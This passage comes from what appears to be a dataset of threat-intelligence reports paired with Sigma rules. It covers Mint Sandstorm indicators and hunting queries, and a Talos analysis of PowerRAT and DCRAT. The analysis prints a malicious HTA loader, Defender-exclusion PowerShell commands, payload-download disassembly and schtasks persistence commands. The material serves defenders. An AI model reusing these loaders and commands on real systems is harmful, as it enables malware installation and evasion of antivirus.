following mitigations to reduce the impact of activity associated with recent Mint Sandstorm campaigns.\n\n- Use the Attack Simulator in Microsoft Defender for Office 365 to organize realistic, yet safe, simulated phishing and password attack campaigns in your organization by training end-users against clicking URLs in unsolicited messages and disclosing their credentials. Training should include checking for poor spelling and grammar in phishing emails or the application’s consent screen as well as spoofed app names, logos and domain URLs appearing to originate from legitimate applications or companies. Note that Attack Simulator testing only supports phishing emails containing links at this time.\n- Encourage users to use Microsoft Edge and other web browsers that support SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware. Turn on network protection to block connections to malicious domains and IP addresses.\n- Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants.\n\nMicrosoft Defender XDR customers can also turn on attack surface reduction rules to harden their environments against techniques used by this Mint Sandstorm subgroup. These rules, which can be configured by all Microsoft Defender Antivirus customers and not just those using the EDR solution, offer significant protection against the tradecraft discussed in this report.\n\n- Block executable files from running unless they meet a prevalence, age, or trusted list criterion.\n- Block JavaScript or VBScript from launching downloaded executable content.\n- Block execution of potentially obfuscated scripts.\n\n## Detection details\n\n### Microsoft Defender Antivirus\n\nMicrosoft Defender Antivirus detects activity associated with the MediaPl backdoor as the following malware:\n\n- Backdoor:Win64/Eyeglass.A\n\nMicrosoft Defender Antivirus detects activity associated with the MischiefTut backdoor as the following malware:\n\n- Behavior:Win32/MischiefTut\n\n### Microsoft Defender for Endpoint\n\nMicrosoft Defender for Endpoint provides customers with detections and alerts. Alerts with the following titles in the Security Center can indicate threat activity related to Mint Sandstorm.\n\n- Possible Mint Sandstorm activity\n- Anomaly detected in ASEP registry\n\n## Threat intelligence reports\n\nMicrosoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.\n\n### Microsoft Defender Threat Intelligence\n\n- Nation-state threat actor Mint Sandstorm refines tradecraft to attack high-value targets\n- Mint Sandstorm delivers MischiefTut to researchers in tailored phishing campaigns\n\n### Microsoft Defender XDR Threat analytics\n\n- Nation-state threat actor Mint Sandstorm refines tradecraft to attack high-value targets\n\n## Indicators of compromise\n\nOrganizations who fit the targeting model discussed in this report can hunt for the following indicators of compromise in their environments.\n\n### Domains\n\n- *east-healthy-dress[.]glitch[.]me*\n- *coral-polydactyl-dragonfruit[.]glitch[.]me*\n- *kwhfibejjyxregxmnpcs[.]supabase[.]co*\n- *epibvgvoszemkwjnplyc[.]supabase[.]co*\n- *ndrrftqrlblfecpupppp[.]supabase[.]co*\n- *cloud-document-edit[.]onrender[.]com*\n\n### Files\n\n- *MediaPl.dll* (SHA-256: *f2dec56acef275a0e987844e98afcc44bf8b83b4661e83f89c6a2a72c5811d5f*)\n\n## Advanced hunting\n\n### Microsoft Defender XDR\n\n**Curl command used to retrieve malicious files**\n\nUse this query to locate the curl command Mint Sandstorm used to pull down malicious files in this campaign.\n\n```\nDeviceProcessEvents\n| where InitiatingProcessCommandLine has_all('id=', '&Prog') and InitiatingProcessCommandLine has_any('vbs', '--ssl')\n```\n\n**Creation of log files**\n\nUse this query to identify files created by Mint Sandstorm, ostensibly for exfiltration.\n\n```\nDeviceProcessEvents\n| where InitiatingProcessCommandLine has_all('powershell', '$pnt', 'Get-Content', 'gcm') and InitiatingProcessCommandLine has_any('documentLog', 'documentLoger', 'Logdocument')\n```\n\n**Files with double file name extensions**\n\nUse this query to find files with double extension, e.g., .pdf.lnk.\n\n```\nDeviceFileEvents\n| where FileName endswith \".pdf.lnk\"\n```\n\n**Registry keys with VBScript**\n\nUse this query to find registry run keys entry with VBScript in value.\n\n```\nDeviceRegistryEvents\n| where ActionType == \"RegistryValueSet\" or ActionType == \"RegistryKeyCreated\"\n| where RegistryKey endswith @\"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" or\nRegistryKey endswith @\"\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" or\nRegistryKey endswith @\"\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n| where RegistryValueData has_any (\"vbscript\",\".vbs\")\n```\n\n### Microsoft Sentinel\n\nMicrosoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.\n\n- Email delivered to inbox\n- Delivered bad emails from top bad IPv4 addresses\n- Phishing link execution observed\n- Successful sign-in from phishing link\n- Suspicious URL clicked\n- Scheduled task creation update from user writable directory\n- Remote Scheduled Task creation update via Schtasks",
    "sigma_rule": {
      "title": "Renamed NirCmd.EXE Execution",
      "id": "264982dc-dbad-4dce-b707-1e0d3e0f73d9",
      "status": "test",
      "description": "Detects the execution of a renamed \"NirCmd.exe\" binary based on the PE metadata fields.",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/",
        "https://www.nirsoft.net/utils/nircmd.html"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2024-03-11",
      "tags": [
        "attack.execution",
        "attack.t1059",
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "OriginalFileName": "NirCmd.exe"
        },
        "filter_main_img": {
          "Image|endswith": [
            "\\nircmd.exe",
            "\\nircmdc.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_nircmd.yml"
  },
  "13": {
    "url": "https://blog.talosintelligence.com/gophish-powerrat-dcrat/",
    "markdown": "# Threat actor abuses Gophish to deliver new PowerRAT and DCRAT\n\nOctober 22\n\n**Categories:** RAT, Threats\n\n---\n\n- Cisco Talos recently discovered a phishing campaign using an open-source phishing toolkit called Gophish by an unknown threat actor.\n- The campaign involves modular infection chains that are either Maldoc or HTML-based infections and require the victim’s intervention to trigger the infection chain.\n- Talos discovered an undocumented PowerShell RAT we’re calling PowerRAT, as one of the payloads and another infamous Remote Access Tool (RAT) DCRAT.\n- We found a few placeholders for base64 encoded PowerShell scripts in the PowerRAT, indicating that the threat actor is actively developing their tools.\n\n## Victimology\n\nTalos assesses with high confidence that the threat actor is targeting Russian-speaking users based on the language used in the Phishing emails, luring contents of Malicious documents, a masqueraded HTML webpage of Vkontake (VK), a popular social media application amongst Russian speakers, especially in Russia, Ukraine, Belarus, Kazakhstan, Uzbekistan, and Azerbaijan.\n\n| **Targeted Regions** |\n|----------------------|\n| Russia               |\n| Ukraine              |\n| Belarus              |\n| Kazakhstan           |\n| Uzbekistan           |\n| Azerbaijan           |\n\n## Actor uses Gophish to send phishing emails\n\nOur analysis of the malicious hyperlinks embedded in the phishing emails disclosed to us the attacker-controlled hosting domains `disk-yanbex[.]ru` delivered the Malicious Microsoft Word document, and an HTML file embedded with the malicious JavaScript.\n\nThe domain `disk-yanbex[.]ru` resolves to the IP address `34[.]236[.]234[.]165`, an AWS EC2 instance with the fully qualified domain name `ec2-34-236-234-165[.]compute-1[.]amazonaws[.]com`, during our analysis. We also observed that the same server `34[.]236[.]234[.]165` was reverse resolving to another domain `e-connection[.]ru`, which also delivered malicious JavaScript-embedded HTML files. Our further analysis of the server `34[.]236[.]234[.]165` disclosed to us that the actor hosted the Gophish toolkit on the server running at port number 3333. Gophish is an Open-Source easy-to-deploy phishing toolkit that is developed to conduct security awareness training according to the tool’s developer.\n\n```image\nAlt: Attacker hosting Gophish.\nDescription: The image displays a login page for Gophish, an open-source phishing toolkit. The interface shows a prompt asking for a username and password, with a 'Sign in' button. The URL in the browser indicates that the login page is hosted on an AWS EC2 instance with the IP address `34.236.234.165` at port 3333. The design includes a logo resembling a fishing hook, reinforcing the phishing theme.\nTranscription: |\n  Gophish - Login\n  \n  Please sign in\n  \n  Username\n  Password\n  \n  Sign in\n```\n\nTalos analysis of the phishing email sample’s header showed us that the email was first delivered from server `34[.]236[.]234[.]165`, indicating that the threat actor is misusing the Gophish framework in this campaign to deliver phishing emails to their targets.\n\n```image\nAlt: Sample Phishing email header.\nDescription: The image displays a screenshot of a phishing email header analysis. It captures detailed SMTP information regarding the email's delivery path, including timestamps, server IPs, and encryption details. The highlighted section shows that the email was received from an EC2 instance associated with the IP address 34.236.234.165, indicating that the threat actor is utilizing this server for their phishing activities. The header reveals the email's origin and the servers involved in its transmission, which is crucial for understanding the phishing attack's infrastructure.\nTranscription: |\n  Received: from VDC01-PEEXCH-08.tn.tngrp.ru (10.5.112.25)\n          by VDC01-PEEXCH-08.tn.tngrp.ru (10.5.112.20) with Microsoft SMTP Server\n          (version=TLS1.2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id\n          15.2.1118.40 via Mailbox Transport; Thu, 1 Aug 2024 09:42:15 +0300\n  Received: from VDC01-PEEXCH-04.tn.tngrp.ru (10.5.112.21)\n          by VDC01-PEEXCH-08.tn.tngrp.ru (10.5.112.25) with Microsoft SMTP Server\n          (version=TLS1.2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id\n          15.2.1118.40; Thu, 1 Aug 2024 09:42:14 +0300\n  Received: from VDC01-PEPMVTI01.TN.TNGRP.RU (VDC01-PEPMVTI01)\n          by VDC01-PEMSR04.TN.TNGRP.RU (Postfix) with ESMTPS id D74A18000A;\n          Thu, 1 Aug 2024 09:42:14 +0300 (MSK)\n  Received: from mysap.dc-prod.tn.corp (vdc01-dzpfpt-02.dc-prod.tn.corp [10.7.95.145])\n          by VDC01-PEPMVTI01.TN.TNGRP.RU (Postfix) with ESMTPS id D1B318002CF\n          for <transfer@tak.transnet.ru>; Thu, 1 Aug 2024 09:42:14 +0300 (MSK)\n  Received: from vdc01-dzpfpt-02.dc-prod.tn.corp (localhost [127.0.0.1])\n          by mysap.dc-prod.tn.corp (Postfix) with ESMTP id CA065C0008\n          for <transfer@tak.transnet.ru>; Thu, 1 Aug 2024 09:42:10 +0300 (MSK)\n  Received: from mail.minenergo.com.ru (mail.minenergo.com.ru [147.45.164.199])\n          by mysap.dc-prod.tn.corp (Postfix) with ESMTPS\n          id A5256-GCM-SHA384 (256/256 bits))\n          for <transfer@tak.transnet.ru>; Thu, 1 Aug 2024 09:42:10 +0300 (MSK)\n  Received: from ec2-34-236-234-165.compute-1.amazonaws.com ([34.236.234.165] helo=ip-172-31-23-243)\n          by mail.minenergo.com.ru with esmtps (TLS1.3) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\n          (Exim 4.93)\n          (envelope-from <minenergo@minenergo.com.ru>)\n          id 1zPvr-001cn8-LZ\n          for transfer@tak.transnet.ru; Thu, 01 Aug 2024 09:42:11 +0300\n  From: =?utf-8?B?Q3V0YQ==?= <novas@minenergo.com.ru>\n  To: =?utf-8?B?Q2F0aW5hQ2luY0l0YQ==?= <transfer@tak.transnet.ru>\n  Subject: =?utf-8?B?Q1V0YQ==?= <transfer@tak.transnet.ru>\n```\n\n## Multi-modular Campaign delivers PowerRAT and DCRAT\n\nThe campaign has two initial attack vectors, one based on malicious Word documents and another based on HTML files containing malicious JavaScript. Upon activation, these would lead to the download and activation of PowerRAT or DCRAT depending on the initial vector. Both the attack chains require user intervention to trigger the infections on the compromised machines.\n\n```image\nAlt: Multi-modular Campaign\nDescription: The image is a flowchart titled \"Campaign overview\" that outlines the process of a cyber attack campaign. It begins with a \"Phishing Email\" leading to a \"User Clicks\" action, which directs to a \"Malicious Link.\" The flowchart details that this link leads to a hosting server that downloads either a \"Malicious HTML\" or a \"Maldoc.\" The flow further indicates that the malicious HTML leads to a DCRAT payload, while the Maldoc leads to a PowerRAT payload. Each payload is connected to command and control (C2) servers, with specific IP addresses listed for both the DCRAT and PowerRAT payloads.\nTranscription: |\n  Campaign overview\n  \n  Phishing Email → User Clicks → Malicious Link → Hosting server\n  34.236.234.165\n  disk-yanbex.ru\n  e-connection.ru\n         ↓\n      Downloads\n         ↓\n  Malicious HTML → Payload → DCRAT\n         ↓\n        C2\n  Strepsils.top\n  cr87986.tw1.ru\n  \n         ↓\n      Downloads\n         ↓\n      Maldoc → Payload → PowerRAT\n         ↓\n        C2\n  94.103.85.47\n  5.252.176.55\n```\n\n## Maldoc-based infection delivers PowerRAT\n\nWhen a victim opens the Microsoft Word document and enables the view contents button displayed in the document banner, the malicious VB macro program executes.\n\n```image\nAlt: Malicious VB Macro\nDescription: The image depicts a flowchart illustrating the 'Maldoc-based Infection chain.' It shows the step-by-step process starting from a malicious document (Maldoc) that contains a VB Macro. The flowchart highlights various actions such as writing and dropping files, executing a PowerShell loader, and ultimately leading to the execution of PowerRAT. Additionally, it includes references to the AutoRun LOAD registry key and the communication with command and control (C2) servers, providing a clear representation of the infection process.\nTranscription: |\n  Maldoc-based Infection chain\n  \n  Maldoc\n     |\n     v\n  VB Macro\n     |\n     | Writes\n     |\n     v\n  AutoRun LOAD registry key\n     |\n     | Executes\n     |\n     v\n  Victim logins to the machine\n     |\n     | Drops\n     |\n     v\n  Malicious HTA UserCache.ini.hta\n     |\n     | Executes\n     |\n     v\n  PowerShell Loader decrypts UserCache.ini\n     |\n     | Executes\n     |\n     v\n  PowerRAT\n     |\n     |\n     v\n  C2 Server\n     |\n     | 94.103.85.47\n     | 5.252.176.55\n```\n\nThe macro program initially executes a function that decodes or translates specific encoded symbols in the lure contents of the Word document into their corresponding characters from another alphabet in Cyrillic, transforming the lure contents into readable form.\n\nWe spotted a base64 encoded data blob on the third page of the Word document and the actor used the text color the same as that of the document's default background color, hiding them from the victim’s view.\n\n```image\nAlt: Base64 Encoded Data\nDescription: The image depicts a screenshot of the third page of a Microsoft Word document. It contains a base64 encoded data blob highlighted with the search terms 'DigitalRSASignature:' and 'CHECKSUM' in orange boxes. The text appears in a mix of Cyrillic and Latin characters, showcasing the encoded payload that the malicious VB macro is designed to search for and process. The layout includes a header indicating the content's context regarding the encoded data, and the encoded string itself is displayed in a long block beneath the highlighted search terms.\nTranscription: |\n  Document page 3 contining the encoded data blob with the search terms DigitalRSASignature: and CHECKSUM\n  \n  DigitalRSASignature: PGhObWw+DQo8SFRBokFQUExJQ0FUUS9OIGjb249iTiMiFdJtRkPV1NUQVRFPSJtaW5pWl6ZIg0...\n```\n\nTo identify the hidden encoded data, the macro executes a function that searches for specific strings such as “DigitalRSASignature:” and “CHECKSUM” in the content section of the Word document, and when found, it copies the data following the search strings to an array.\n\nTo decode the base64 encoded data blob, the actor uses a custom function called `CheckContent()` in the macro. It removes any “=” characters which are the padding characters in the encoded data blob and decodes them into two parts in a byte array. The first part is the contents of a malicious HTML application (HTA) file and the second is a PowerShell loader.\n\nThe macro drops the decoded contents of the malicious HTA file to `UserCache.ini.hta` and the PowerShell loader into `UserCache.ini` in the victim machine's current user profile folder.\n\nThe actor has abused the Windows NT current version autorun registry key called “LOAD”. The registry key `HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\LOAD` is used by Windows to automatically launch applications or processes when a user logs into their account. Specifically, this key stores information about programs that are set to load upon user login. It works similarly to other startup mechanisms in Windows (such as the Startup folder or the Run registry keys), but this specific key is less commonly used. The macro after dropping the malicious HTA and the PowerShell loader script in the victim machine user profile folder, it configures the registry key `HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\LOAD` with the value `C:\\Users\\<Username>\\UserCache.ini.hta`.\n\nFinally, the macro checks if there are any headers in the Word documents and deletes the contents of the headers from all sections of the Word document.\n\n## Intermediate phase includes Malicious HTA, JavaScript, and PowerShell Loader\n\nThe malicious HTA `UserCache.ini.hta` is executed through the LOAD registry key when a victim logs into the machine. It drops a JavaScript called `UserCacheHelper.lnk.js` in the victim machine user profile folder and writes a single line code embedding with a PowerShell command to execute the dropped PowerShell Loader masquerading as `UserCache.ini` file. The HTA file executes the JavaScript `UserCacheHelper.lnk.js` using the LOLbin `cscript.exe`.\n\n```image\nAlt: Sample of malicious HTA file.\nDescription: The image displays a snippet of malicious HTA (HTML Application) code. It includes JavaScript that defines variables and executes commands to interact with the Windows PowerShell environment. The code is designed to retrieve a JavaScript file named `UserCacheHelper.lnk.js` and execute it using `cscript.exe`. It highlights the use of `Invoke-Expression` to run content from a path derived from the user profile, indicating its malicious intent to load additional payloads.\nTranscription: |\n  html\n  <HTA:APPLICATION icon=\"#\" WINDOWSTATE=\"minimize\" SHOWINTASKBAR=\"no\" SYSMENU=\"no\" CAPTION=\"no\" />\n  <body>\n  <script>\n  var dig = 0;\n  var shell = new ActiveXObject(\"Shell.Application\");\n  var args = \"/c echo new ActiveXObject(\\\"Shell.Application\\\").ShellExecute(\";\n  switch (shell.NameSpace(\"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\")) {\n  case null:\n      args = args + \"\\\"powershell.exe\\\"\";\n      break;\n  default:\n      args = args + \"\\\"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"\";\n  }\n  var userProfile = \"C:\\\\Users\\\\ROLEX\\\\\";\n  var userProfileDouble = userProfile.replace(/\\\\/g, \"\\\\\\\\\");\n  args = args + \", \\\"-\" + \"$raw= Get-Content -Path \" + userProfileDouble + \"UserCacheHelper.lnk.js;Invoke-Expression $raw\\\\\\\"\\\", \\\"\\\", \\\"open\\\", dig\";\n  shell.ShellExecute(\"cmd.exe\", args, \"\", \"open\", dig);\n  var user = shell.NameSpace(0x28);\n  shell.ShellExecute(userProfile + 'UserCacheHelper.lnk.js', '', 'open', dig);\n  </script>\n  <script>\n  self.close();\n  </script>\n  </body>\n  </html>\n  \n  (new ActiveXObject(\"Shell.Application\")).ShellExecute(\"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"-c \"$raw= Get-Content -Path C:\\\\Users\\\\ROLEX\\\\UserCache.ini;Invoke-Expression $raw\"\", \"\", \"open\", 0)\n```\n\nThe dropped JavaScript `UserCacheHelper.lnk.js` loads the contents of the `UserCache.ini` and executes it using the `Invoke-Expression` PowerShell command. The PowerShell Loader script masquerading as the INI file contains base64 encoded data blob of the payload PowerRAT, which decodes and executes in the victim’s machine memory.\n\n```image\nAlt: Sample PowerShell Loader script embedded with PowerRAT.\nDescription: The image displays a snippet of a PowerShell script that includes a base64 encoded string. The script uses the System.Convert class to decode the base64 string and execute it using the Invoke-Expression command (iex). The highlighted portion indicates the specific encoded data being decoded, which is likely related to the PowerRAT payload described in the context. This script is part of a malicious operation as outlined in the surrounding text.\nTranscription: |\n  $base = \"W2VudWlyb25tZW50ZXJlcmVpcmVjb21pxleHRpb25zY29tcGxleHRpb25zY29tcGxleHRpb25zY2...\n```\n\n## PowerRAT expands the attack vector for further infections\n\nTalos discovered a new PowerShell remote access tool as one of the payloads in this campaign we are calling PowerRAT that executes in the victim’s machine memory. It has the functionality of executing other PowerShell scripts or commands as directed by the C2 server, enabling the attack vector for further infections on the victim machine.\n\nThe PowerRAT that executes in the victim machine memory initially checks if the JavaScript `UserCacheHelper.lnk.js` exists in the user profile folder and if not found, it will reinfect the victim machine by performing the actions of the PowerShell loader script described in the previous section. Then it hides the `UserCache.ini` by modifying the file attributes to “Hidden”.\n\nThe PowerRAT performs reconnaissance on the victim’s machine by executing a function `GetID()` which collects the username, computer name, and the system driver letter through the PowerShell command `Get-CimInstance`. It also collects the drive serial number through the `win32_volume` class of `WMIobject`. The collected data is written to memory in the format `<Computername_Username_drive serial number>`.\n\nAfter performing the reconnaissance, the PowerRAT attempts to connect to the C2 server by sending the collected data of the victim’s machine using a hardcoded URL through the HTTP GET method. The C2 servers identified in this campaign are `94[.]103[.]85[.]47` located in Russia with the ASN 48282 of Hosting Technology LTD and `5[.]252[.]176[.]55` also geographically located in Russia with the ASN 39798 of MivoCloud SRL.\n\nWhen there is no response from the C2 server, the PowerRAT has a placeholder function called `offlineworker()` that has the functionality to decode an embedded base64 encoded string of a PowerShell script and executes it using the `Invoke-Expression` command. The actor has built this functionality to keep the infection alive in the victim machine even if the victim's environment detects the malicious C2 traffic and blocks the connection. We didn’t see any embedded base64 encoded strings in the PowerRAT sample that we analyzed and is likely a placeholder, indicating that the actor is actively developing and updating their tools.\n\nThe PowerRAT generates a random number between 7 - 23 and pauses its execution for (300 + random number) seconds and re-attempts to connect to the C2 server continuously waiting for a response. During our analysis, the C2 servers were not responding, and still, our further analysis of the PowerRAT showed us that the C2 server will likely respond with an XML configuration file having multiple modules with embedded base64 encoded PowerShell commands or scripts.\n\nThe PowerRAT has the functionality to parse the received XML file and search for the sections called `config`. It periodically executes the embedded encoded PowerShell commands or scripts, according to their defined intervals and run limits. The PowerRAT continues to run until all commands or scripts in the config sections are executed the required number of times.\n\n## HTML-based infection delivers DCRAT\n\nTalos discovered that the threat actor is also using HTML files embedded with malicious JavaScript in this campaign that are delivered to the victims through the malicious links in the phishing email, leading to the infection of the DCRAT payload.\n\nWhen a victim clicks on the malicious link in the phishing email, a remotely located HTML file containing the malicious JavaScript opens in the victim machine’s browser and simultaneously executes the JavaScript. The JavaScript has a base64 encoded data blob of a 7-ZIP archive of a malicious SFXRAR executable. It decodes the embedded base64 encoded data blob into binary data blob with the type “application/octet-stream” in the memory. A download URL for the binary data blob is created using the `URL.createObjectURL()` method and assigned to a variable in memory. It calls the `click()` method on the URL of the binary data blob which triggers the download of the binary data to a 7-Zip archive file. The malicious 7-Zip archive masquerades as the VK messenger application archive file in one of the malicious HTML files and another with a Russian name. The actor is using this technique in the JavaScript function to masquerade as the actual download activity of a file over the internet through a browser.\n\nA victim must inflate the 7-Zip archive manually to run the SFXRAR executable which is masquerading as the legitimate VK application executable which leads to DCRAT infection. The SFX RAR executable is packaged with the malicious loader or dropper executables, batch file, and a decoy document in some samples.\n\nWhen a victim runs the SFX executable, the SFX script drops the packaged files into a folder and executes the batch file which runs another password-protected SFXRAR with the hardcoded password “riverdD” and runs the DCRAT.\n\nIn another sample, we observed that the SFXRAR drops the GOLoader and the decoy document Excel spreadsheet in the victim machine user profile applications temporary folder and runs the GOLoader along with opening the decoy document.\n\nTalos observed an overlap of the technique used by the threat actor in this campaign with an earlier SparkRAT attack reported by Hunt researchers in April 2024, indicating that SparkRAT is another payload in the threat actor’s arsenal.\n\n## GOLoader downloads and runs the DCRAT\n\nIn DCRAT infection, the SFX script runs a malicious Loader executable and simultaneously opens a decoy document. The malicious loader executable we are calling “GOLoader” is compiled in Golang. It modifies the configuration settings for Microsoft Defender Antivirus, specifically by excluding the root directory `C:\\` and the folder `C:\\Users\\$user\\Desktop` in the victim machine by executing the PowerShell commands.\n\n| **PowerShell Commands**                                                        |\n|--------------------------------------------------------------------------------|\n| `powershell -Command Add-MpPreference -ExclusionPath 'C:\\Users\\$user\\Desktop'` |\n| `powershell -Command Add-MpPreference -ExclusionPath 'C:\\'`                    |\n\nAfter configuring the exclusion paths, the GOLoader downloads the DCRAT binary data stream from a remote location through a hardcoded URL and writes it into a dropped executable with the file name `file.exe` in the desktop folder on the victim’s machine. During our analysis, we found that the remote location URL hardcoded in the GOLoader was pointing to a GitHub repository, which was not accessible. However, we found that the hosted payload binary in the GitHub repository is the Dark Crystal RAT (DCRAT) binary based on open-source intelligence data.\n\n```image\nAlt: DCRAT Payload\nDescription: The image displays a snippet of assembly or machine code related to the GOLoader executable discussed in the context of the DCRAT infection. It includes various instructions that indicate the process of accessing user environment variables, manipulating file paths, and preparing to execute a command. The specific operations involve loading and modifying pointers, as well as calling functions related to file handling and execution, ultimately suggesting an operation to download and execute a malicious payload.\nTranscription: |\n  mov     qword ptr [rsp+88h+var_20+8], rbx\n  mov     qword ptr [rsp+88h+var_20], rax\n  mov     rcx, aDesktop          ; \"Desktop\"\n  mov     ebx, 2\n  rcx, rbx\n  call    path_filepath_join\n  main_jtkadw\n  rax, ac_24                    ; \"C:\\\\\"\n  ebx, 3\n  main_jtkadw\n  eax, 3000000000\n  time_Sleep\n  ebx, aUserprofile            ; \"USERPROFILE\"\n  os_Getenv\n  movups  [rsp+88h+var_50], xmm15\n  movups  [rsp+88h+var_40], xmm15\n  movups  [rsp+88h+var_30], xmm15\n  mov     qword ptr [rsp+88h+var_50], rbx\n  mov     qword ptr [rsp+88h+var_40+8], 7\n  lea     rcx, [rsp+88h+var_20]\n  mov     ebx, 3\n  mov     qword ptr [rsp+88h+var_40], rcx\n  mov     rcx, [rsp+88h+var_30+8], 8\n  qword ptr [rsp+88h+var_30], rcx\n  ebx, 3\n  nop\n  dword ptr [rax+0h]\n  call    path_filepath_join\n  mov     qword ptr [rsp+88h+var_58], rax\n  mov     qword ptr [rsp+88h+var_60], rbx\n  mov     rcx, rax\n  lea     rax, httpsGithubCom ; https://github.com/MrBrounr/main/raw/main/naker.exe\n  eax, 33h                     ; '3'\n  call    main_lkajs\n  rax, [rsp+88h+var_58]\n  mov     [rsp+88h+var_60], rbx\n  eax, ebx\n  xor     rsi, rdi\n  mov     dword ptr [rax+0h]\n  call    os_exec_Command\n```\n\n## Threat actor delivers DCRAT\n\nThe payload Dark Crystal RAT (DCRAT) sample that we analyzed in this campaign is a modular RAT associated with plugins to perform the DLL injection and information stealing tasks.\n\nKey features of the DCRAT sample of this campaign include:\n\n- Provides remote control access to the victim machine to the actor who can execute arbitrary commands, manage files, and monitor user activities.\n- It has the capability of downloading and executing other files on the victim's machine.\n- With its stealer plugin modules, the RAT can steal sensitive information including credentials, files, and financial information from the victim's machine.\n- The RAT can take screenshots and capture the keystrokes on the victim's machine.\n- We found that the RAT creates multiple copies of its binary masquerading as legitimate Windows executables including `csrss.exe`, `dllhost.exe`, `taskhostw.exe`, and `winlogon.exe` in the folders such as ProgramData, Pictures, Saved Games, and Windows start menu. It drops the embedded modules in the administrator user desktop folder using random file names and with the `.log` file extension.\n\n| **File Paths**                                                                |\n|-------------------------------------------------------------------------------|\n| `C:\\Users\\admin\\Desktop\\zaHrebVC.log`                                         |\n| `C:\\Users\\admin\\Desktop\\HQLYdHol.log`                                         |\n| `C:\\Users\\admin\\Desktop\\qJutJUJW.log`                                         |\n| `C:\\Users\\Default\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\taskhostw.exe` |\n| `C:\\ProgramData\\dllhost.exe`                                                  |\n| `C:\\Users\\Default\\Pictures\\csrss.exe`                                         |\n| `C:\\Users\\Default\\Saved Games\\winlogon.exe`                                   |\n\n- It establishes persistence on the victim machine by creating several Windows tasks to run at different intervals or during the Windows login process.\n\n### Task Scheduler Commands\n\n| **Command**                                                                                                                |\n|----------------------------------------------------------------------------------------------------------------------------|\n| `schtasks.exe /create /tn \"winlogonw\" /sc MINUTE /mo 11 /tr \"'C:\\Users\\Default\\Saved Games\\winlogon.exe'\" /f`              |\n| `schtasks.exe /create /tn \"winlogon\" /sc ONLOGON /tr \"'C:\\Users\\Default\\Saved Games\\winlogon.exe'\" /rl HIGHEST /f`         |\n| `schtasks.exe /create /tn \"winlogonw\" /sc MINUTE /mo 5 /tr \"'C:\\Users\\Default\\Saved Games\\winlogon.exe'\" /rl HIGHEST /f`   |\n| `schtasks.exe /create /tn \"csrssc\" /sc MINUTE /mo 12 /tr \"'C:\\Users\\Default\\Pictures\\csrss.exe'\" /f`                       |\n| `schtasks.exe /create /tn \"csrss\" /sc ONLOGON /tr \"'C:\\Users\\Default\\Pictures\\csrss.exe'\" /rl HIGHEST /f`                  |\n| `schtasks.exe /create /tn \"csrssc\" /sc MINUTE /mo 7 /tr \"'C:\\Users\\Default\\Pictures\\csrss.exe'\" /rl HIGHEST /f`            |\n| `schtasks.exe /create /tn \"dllhostd\" /sc MINUTE /mo 11 /tr \"'C:\\Users\\Public\\dllhost.exe'\" /f`                             |\n| `schtasks.exe /create /tn \"dllhost\" /sc ONLOGON /tr \"'C:\\Users\\Public\\dllhost.exe'\" /rl HIGHEST /f`                        |\n| `schtasks.exe /create /tn \"dllhostd\" /sc MINUTE /mo 12 /tr \"'C:\\Users\\Public\\dllhost.exe'\" /rl HIGHEST /f`                 |\n| `schtasks.exe /create /tn \"dllhostd\" /sc MINUTE /mo 8 /tr \"'C:\\Users\\All Users\\dllhost.exe'\" /f`                           |\n| `schtasks.exe /create /tn \"dllhost\" /sc ONLOGON /tr \"'C:\\Users\\All Users\\dllhost.exe'\" /rl HIGHEST /f`                     |\n| `schtasks.exe /create /tn \"dllhostd\" /sc MINUTE /mo 11 /tr \"'C:\\Users\\All Users\\dllhost.exe'\" /rl HIGHEST /f`              |\n| `schtasks.exe /create /tn \"taskhostwt\" /sc MINUTE /mo 6 /tr \"'C:\\Users\\Default\\Start Menu\\taskhostw.exe'\" /f`              |\n| `schtasks.exe /create /tn \"taskhostw\" /sc ONLOGON /tr \"'C:\\Users\\Default\\Start Menu\\taskhostw.exe'\" /rl HIGHEST /f`        |\n| `schtasks.exe /create /tn \"taskhostwt\" /sc MINUTE /mo 10 /tr \"'C:\\Users\\Default\\Start Menu\\taskhostw.exe'\" /rl HIGHEST /f` |\n| `schtasks.exe /create /tn \"filef\" /sc MINUTE /mo 13 /tr \"'C:\\Users\\admin\\AppData\\Local\\Temp\\file.exe'\" /f`                 |\n| `schtasks.exe /create /tn \"file\" /sc ONLOGON /tr \"'C:\\Users\\admin\\AppData\\Local\\Temp\\file.exe'\" /rl HIGHEST /f`            |\n| `schtasks.exe /create /tn \"filef\" /sc MINUTE /mo 9 